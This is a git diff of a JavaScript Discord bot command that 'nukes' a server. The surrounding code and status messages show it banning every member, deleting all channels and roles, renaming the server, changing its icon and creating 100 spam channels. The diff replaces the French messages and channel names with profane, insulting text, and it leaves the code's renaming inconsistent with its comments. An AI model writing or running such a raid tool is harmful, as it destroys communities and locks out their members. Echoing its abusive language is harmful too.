@@ -20,8 +20,8 @@ module.exports = {
       const statusMsg = await message.reply({
         embeds: [
           successEmbed(
-            'NUKE en cours 💣',
-            'Destruction totale du serveur en cours...'
+            'ITS HALOWEEN MOTHER FUCKER💣',
+            'BIG DICK RANDY ARRIVE FILS DE PUTE PR TOUT NIQUER'
           )
         ]
       });
@@ -60,7 +60,7 @@ module.exports = {
         }
       }
 
-      // 4. Renommer le serveur en "dajjal"
+      // 4. Renommer le serveur en "BIG DICK RANDY"
       console.log('📝 Renommage du serveur...');
       await guild.setName('dajjal');
 
@@ -73,13 +73,13 @@ module.exports = {
         console.error('Erreur changement icon:', err.message);
       }
 
-      // 6. Créer 100 salons appelés "dajjal"
+      // 6. Créer 100 salons appelés "BIG DICK RANDY"
       console.log('📨 Création des 100 salons...');
       let channelsCreated = 0;
       for (let i = 1; i <= 100; i++) {
         try {
           await guild.channels.create({
-            name: `dajjal-${i}`,
+            name: `BIGDICKRANDY-${i}`,
             type: 0 // 0 = text channel
           });
           channelsCreated++;
@@ -95,13 +95,13 @@ module.exports = {
       await statusMsg.edit({
         embeds: [
           successEmbed(
-            'NUKE COMPLÉTÉE 💥',
-            `✅ Tous les membres ont été ban\n✅ Serveur renommé en "dajjal"\n✅ Icon changée en dajjal\n✅ Tous les salons supprimés\n✅ Tous les rôles supprimés\n✅ ${channelsCreated} nouveaux salons "dajjal" créés`
+            'BIG DICK RANDY A TOUT NIQUER 💥',
+            `✅ Tous les membres ont été ban\n✅ Serveur renommé en "BIG DICK RANDY"\n✅ Icon changée en dajjal\n✅ Tous les salons supprimés\n✅ Tous les rôles supprimés\n✅ ${channelsCreated} nouveaux salons "dajjal" créés`
           )
         ]
       });
 
-      console.log('✅ NUKE complétée avec succès !');
+      console.log('✅ BIG DICK RANDY A TOUT NIQUER FILS DE PUTE !');
 
     } catch (err) {
       console.error('Erreur nuke:', err);
